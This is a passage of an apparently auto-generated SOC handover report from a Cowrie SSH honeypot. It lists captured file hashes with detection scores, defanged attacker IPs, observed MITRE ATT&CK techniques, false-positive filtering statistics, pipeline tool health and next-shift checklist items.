| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/73** 🔴 |
| `fc6f8ae5f64e4f17481f7e3be29a1c56949f216a998414188003eae1db20c9e5` | GZip Archive | `fc6f8ae5f64e4f17...` | 14/100 | 🟢 LOW | **35/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `206.81.2[.]201` | US | DigitalOcean, LLC | **100** ⚠️ | 9 |
| `135.148.33[.]168` | US | OVH US LLC | **100** ⚠️ | 9 |
| `2.55.122[.]202` | IL | Partner Communications Ltd. | **100** ⚠️ | 50 |
| `111.70.32[.]6` | TW | CHT-Mobile business Group,Chunghwa | **100** ⚠️ | 50 |
| `85.229.46[.]153` | SE | Telenor Sverige AB | **100** ⚠️ | 47 |
| `58.49.26[.]202` | CN | CHINANET Hubei province network | **100** ⚠️ | 50 |
| `40.124.175[.]16` | US | Microsoft Corporation | **100** ⚠️ | 50 |
| `14.103.114[.]197` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `46.32.228[.]2` | GB | Heart Internet Ltd | **100** ⚠️ | 2 |
| `14.103.107[.]214` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 36 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 22 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 9 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 4 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 4 |

---

## 🔕 False Positive Summary (31 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 24 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 29 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 92 cases |
| Tool 34  | Credential Extractor        | ✅ 31 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 6 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 25 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 31 filtered (33.7%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 20 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 35 files |
| Tool 33  | YARA Classifier             | ✅ 10 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 9 priority case(s) shown individually · 18 recon entry/entries in table (6 group(s) consolidating 40 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-06-23T20:20:49Z_
